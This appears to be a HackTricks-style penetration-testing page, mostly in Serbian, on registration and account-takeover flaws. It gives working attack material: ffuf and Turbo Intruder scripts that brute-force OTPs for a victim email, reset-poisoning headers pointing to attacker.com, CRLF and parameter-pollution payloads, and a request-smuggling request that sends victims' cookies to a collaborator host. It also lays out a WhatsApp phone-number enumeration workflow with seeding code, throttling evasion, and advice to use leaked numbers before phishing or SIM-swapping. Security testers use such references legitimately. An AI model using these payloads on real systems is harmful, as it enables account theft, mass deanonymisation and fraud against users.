# Registration & Takeover Vulnerabilities

{{#include ../banners/hacktricks-training.md}}

## Registration Takeover

### Duplicate Registration

- Pokušajte da kreirate nalog koristeći već postojeće korisničko ime
- Proverite varijacije email-a:
- velika slova
- +1@
- dodajte tačku u email
- specijalni karakteri u delu lokalnog imena emaila (%00, %09, %20)
- Postavite prazne karaktere posle emaila: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Probajte trikove canonicalizacije provajdera emaila (zavisno od servisa):
- Gmail ignoriše tačke i subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` dostavljaju na `victim@gmail.com`
- Neki provajderi nisu osetljivi na velika/mala slova u lokalnom delu
- Neki provajderi prihvataju Unicode confusables. Probajte homoglife i soft hyphen `\u00AD` unutar lokalnog dela
- Zloupotrebite ovo da: zaobiđete provere jedinstvenosti, dobijete duplikat naloga/workspace pozivnice, ili blokirate registraciju žrtve (privremeni DoS) dok pripremate takeover

### Username Enumeration

Proverite da li možete utvrditi kada je korisničko ime već registrovano u aplikaciji.

- Različite poruke o grešci ili HTTP status kodovi
- Razlike u vremenu odgovora (postojeći korisnik može pokrenuti lookup prema IdP/DB)
- Automatsko popunjavanje profila u formi za registraciju za poznate email adrese
- Proverite team/invite tokove: unošenje emaila može otkriti da li nalog postoji

### Password Policy

Kreirajući korisnika, proverite politiku lozinki (da li možete koristiti slabe lozinke).\
U tom slučaju možete pokušati bruteforce kredencijale.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)da naučite kako pokušati account takeovers ili izvući informacije putem **SQL Injections** u formama za registraciju.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Change Email

Kada ste registrovani, pokušajte da promenite email i proverite da li je promena ispravno validirana ili je moguće promeniti na proizvoljne email adrese.

### More Checks

- Proverite da li možete koristiti **disposable emails** (mailinator, yopmail, 1secmail, itd.) ili zaobići blocklistu koristeći subaddressing kao `victim+mailinator@gmail.com`
- **Duga** **lozinka** (>200) može dovesti do **DoS**
- **Proverite rate limits pri kreiranju naloga**
- Koristite username@**burp_collab**.net i analizirajte **callback**
- Ako se koristi verifikacija telefona, proverite edge case-ove parsiranja/injekcija telefona

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Contact-discovery / identifier-enumeration oracles

Messengeri fokusirani na telefonski broj izlažu a **presence oracle** kad god klijent sinhronizuje kontakte. Reprodukovanje WhatsApp-ovih discovery zahteva istorijski je omogućilo **>100M upita po satu**, što je omogućilo skoro potpunu enumeraciju naloga.

**Attack workflow**

1. **Instrument an official client** da snimite zahtev za upload address-book-a (autentifikovan blob normalizovanih E.164 brojeva). Reprodukujte ga sa napadački generisanim brojevima dok ponovo koristite iste cookies/device token.
2. **Batch numbers per request**: WhatsApp prihvata hiljade identifikatora i vraća registrovane/neregistrovane plus metadata (business, companion, itd.). Analizirajte odgovore offline da biste napravili liste meta bez slanja poruka žrtvama.
3. **Horizontally scale** enumeraciju pomoću SIM banki, cloud uređaja, ili residential proxies tako da throttling po nalogu/IP/ASN nikad ne bude okinut.

**Dialing-plan modeling**

Modelujte plan pozivanja za svaku zemlju da biste izbacili nevalidne kandidate. NDSS dataset (`country-table.*`) navodi pozivne kodove, gustinu adopcije, i podelu platformi tako da možete prioritizovati opsege sa visokim brojem pogodaka. Example seeding code:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Prioritizujte prefikse koji odgovaraju stvarnim alokacijama (Mobile Country Code + National Destination Code) pre nego što upitujete oracle, da biste održali korisnu propusnost.

**Pretvaranje enumeracija u ciljane napade**

- Unesite leaked phone numbers (e.g., Facebook’s 2021 breach) u oracle da saznate koje su identitete i dalje aktivne pre phishing, SIM-swapping, ili spamming.
- Razložite popise po zemlji/OS/tipu aplikacije da nađete regione sa slabim SMS filtriranjem ili velikim prihvatanjem WhatsApp Business za lokalizovani social engineering.

**Korelacija ponovnog korišćenja javnog ključa**

WhatsApp izlaže X25519 identity key svakog naloga tokom session setup. Zatražite materijal identiteta za svaki enumerisani broj i uklonite duplikate javnih ključeva da otkrijete farme naloga, klonirane klijente ili nesiguran firmware — deljeni ključevi deanonimizuju multi-SIM operacije.

## Slaba verifikacija Emaila/Telefona (OTP/Magic Link)

Tokovi registracije često verifikuju vlasništvo putem numeričkog OTP-a ili magic-link tokena. Tipične mane:

- Predvidiv ili kratak OTP (4–6 cifara) bez efektivnog rate limiting-a ili praćenja IP/device. Probajte paralelna nagađanja i rotaciju headera/IP-a.
- Ponavljanje OTP-a između akcija ili naloga, ili nije vezan za specifičnog korisnika/akciju (npr. isti kod radi za login i signup, ili radi nakon promene emaila).
- Multi-value smuggling: neki backend-i prihvataju više kodova i verifikuju ako bilo koji odgovara. Probajte:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: razlikujte pogrešan vs istekao vs kod koji pripada drugom korisniku po statusu/poruci/dužini tela.
- Tokeni se ne poništavaju nakon uspeha ili nakon promene lozinke/emaila.
- Verification token nije vezan za user agent/IP što omogućava cross-origin kompletiranje sa stranica pod kontrolom napadača.

Primer brute-force napada sa ffuf protiv JSON OTP endpoint-a:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Paralelno/konkurentno pogađanje da bi se zaobišla sekvencijalna zaključavanja (koristite Turbo Intruder u Burp):

<details>
<summary>Turbo Intruder snippet za poplavu 6-znamenkastih OTP pokušaja</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: pošaljite isti validan OTP istovremeno u dve sesije; ponekad jedna sesija postane verified attacker account dok victim tok takođe uspe.
- Takođe testirajte Host header poisoning na verification links (isto kao reset poisoning ispod) da biste leak ili kompletirali verification na attacker controlled host.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

A powerful class of issues occurs when an attacker performs actions on the victim’s email before the victim creates their account, then regains access later.

Key techniques to test (adapt to the target’s flows):

- Classic–Federated Merge
- Attacker: registers a classic account with victim email and sets a password
- Victim: later signs up with SSO (same email)
- Insecure merges may leave both parties logged in or resurrect the attacker’s access
- Unexpired Session Identifier
- Attacker: creates account and holds a long‑lived session (don’t log out)
- Victim: recovers/sets password and uses the account
- Test if old sessions stay valid after reset or MFA enablement
- Trojan Identifier
- Attacker: adds a secondary identifier to the pre‑created account (phone, additional email, or links attacker’s IdP)
- Victim: resets password; attacker later uses the trojan identifier to reset/login
- Unexpired Email Change
- Attacker: initiates email‑change to attacker mail and withholds confirmation
- Victim: recovers the account and starts using it
- Attacker: later completes the pending email‑change to steal the account
- Non‑Verifying IdP
- Attacker: uses an IdP that does not verify email ownership to assert `victim@…`
- Victim: signs up via classic route
- Service merges on email without checking `email_verified` or performing local verification

Practical tips

- Harvest flows and endpoints from web/mobile bundles. Look for classic signup, SSO linking, email/phone change, and password reset endpoints.
- Create realistic automation to keep sessions alive while you exercise other flows.
- For SSO tests, stand up a test OIDC provider and issue tokens with `email` claims for the victim address and `email_verified=false` to check if the RP trusts unverified IdPs.
- After any password reset or email change, verify that:
- all other sessions and tokens are invalidated,
- pending email/phone change capabilities are cancelled,
- previously linked IdPs/emails/phones are re‑verified.

Note: Extensive methodology and case studies of these techniques are documented by Microsoft’s pre‑hijacking research (see References at the end).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Request password reset to your email address
2. Click on the password reset link
3. Don’t change password
4. Click any 3rd party websites(eg: Facebook, twitter)
5. Intercept the request in Burp Suite proxy
6. Check if the referer header is leaking password reset token.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercept the password reset request in Burp Suite
2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward the request with the modified header\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Look for a password reset URL based on the _host header_ like : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR on API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Napadač mora da se prijavi svojim nalogom i ode na funkciju **Promena lozinke**.
2. Pokrenite Burp Suite i presrecite zahtev
3. Pošaljite ga na repeater tab i izmenite parametre : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Token za reset lozinke treba da bude nasumično generisan i jedinstven svaki put.\
Pokušajte da utvrdite da li token ističe ili je uvek isti; u nekim slučajevima algoritam generisanja je slab i može se pogoditi. Sledeće varijable se mogu koristiti u algoritmu.

- Timestamp
- UserID
- Email of User
- Firstname and Lastname
- Date of Birth
- Cryptography
- Number only
- Small token sequence ( characters between \[A-Z,a-z,0-9])
- Token reuse
- Token expiration date

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Trigger a password reset request using the API/UI for a specific email e.g: test@mail.com
2. Pregledajte server odgovor i proverite za `resetToken`
3. Zatim koristite token u URL-u kao `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Registrujte se na sistem sa korisničkim imenom identičnim korisničkom imenu žrtve, ali sa razmacima ubačenim pre i/ili posle korisničkog imena. e.g: `"admin "`
2. Zatražite reset lozinke sa vašim malicioznim korisničkim imenom.
3. Koristite token poslat na vaš email i resetujte žrtvinu lozinku.
4. Prijavite se na nalog žrtve sa novom lozinkom.

Platforma CTFd je bila ranjiva na ovaj napad.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Pronađite XSS unutar aplikacije ili na poddomeni ako su cookies scoped to the parent domain : `*.domain.com`
2. Leak trenutni **sessions cookie**
3. Autentifikujte se kao korisnik koristeći cookie

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Koristite **smuggler** da detektujete tip HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Sastavite zahtev koji će prepisati `POST / HTTP/1.1` sledećim podacima:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` sa ciljem da open redirect-ujete žrtve na burpcollab i ukradete njihove cookies\
3. Konačan zahtev može izgledati ovako
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone izveštaji o eksploataciji ovog buga\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Account Takeover via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Napravite payload za CSRF, npr: “HTML form with auto submit for a password change”
2. Pošaljite payload

### Account Takeover via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token se može koristiti za autentifikaciju korisnika.

- Izmenite JWT zamenjujući User ID / Email
- Proverite da li je JWT potpis slab

{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

Neki signup handleri izvrše upsert kada prosleđeni email već postoji. Ako endpoint prihvata minimalno telo sa email i password i ne primenjuje verifikaciju vlasništva, slanje žrtvinog email-a će pre-auth prepisati njegovu lozinku.

- Discovery: prikupite nazive endpoint-a iz bundled JS (ili mobile app traffic), zatim fuzz-ujte bazne putanje kao /parents/application/v4/admin/FUZZ koristeći ffuf/dirsearch.
- Method hints: GET koji vraća poruke poput "Only POST request is allowed." često ukazuje na ispravan verb i da se očekuje JSON body.
- Minimalno telo viđeno u praksi:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Primer PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Uticaj: Potpuno preuzimanje naloga (ATO) bez bilo kakvog reset tokena, OTP-a ili verifikacije e-pošte.

## References

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
